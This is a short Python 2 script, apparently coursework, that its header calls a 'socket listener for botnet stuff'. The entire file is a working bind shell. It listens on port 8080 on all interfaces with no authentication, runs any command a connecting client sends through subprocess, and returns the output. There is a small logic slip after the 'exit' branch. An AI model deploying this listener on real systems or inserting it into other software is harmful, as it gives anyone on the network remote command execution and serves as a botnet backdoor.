#!/usr/bin/python2
# By: Brandon Cocanig
# Date due: 3/04/2019 11:59:59
# about: socket listener for botnet stuff
# !/usr/bin/python2

import socket, select, subprocess

# create the listener socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.bind(('', 8080))

listener.listen(10)
# put the socket in a list as input to the select command
allsocks = [listener]

while True:
    # we're only interested in the readers that are ready.
    ready, output, exceptions = select.select(allsocks, [], [])
    for sock in ready:
        # either it's the listening socket:
        if sock == listener:
            c, addr = listener.accept()
            print "New connection from ", addr
            allsocks.append(c)
        # otherwise, it's a command to execute from a
        #  previously established client socket
        else:
            commstr = sock.recv(1024)  # max size
            if commstr:  # if it's not empty
                # split up into command + arguments
                command = commstr.rstrip().split(" ")
                print "Executing command: \n", command
                # want to run with exception handling,
                # so a mistake doesn't bring the whole server down
                if command[0] == "exit":
                    sock.close()
                    allsocks.remove(sock)
                try:
                    out = subprocess.Popen(command, stdout=subprocess.PIPE).communicate()[0]
                except:
                    out = "Command failed\n"
                    sock.send(out)
                    print "Command failed"
                else:  # command finished, send the output to client
                    sock.send(out)
                    # only one command per connection, for now...
                    #sock.close()
                    #allsocks.remove(sock)

# this line is never reached
listener.close()